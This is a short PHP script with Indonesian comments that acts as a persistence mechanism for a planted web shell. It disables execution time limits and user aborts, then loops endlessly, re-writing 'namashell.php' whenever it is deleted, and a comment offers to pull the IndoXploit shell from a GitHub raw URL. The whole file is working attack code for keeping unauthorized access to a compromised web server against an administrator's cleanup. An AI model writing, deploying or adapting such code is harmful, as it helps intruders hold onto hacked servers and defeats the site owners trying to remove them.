<?php
ignore_user_abort(true);
set_time_limit(0);

$file = "namashell.php"; //bebas
$content = file_get_contents($file); // atau bisa diganti file_get_contents("https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php");

while(True){
    if(!file_exists($file)){
        file_put_contents($file, $content);
    }
}
?>
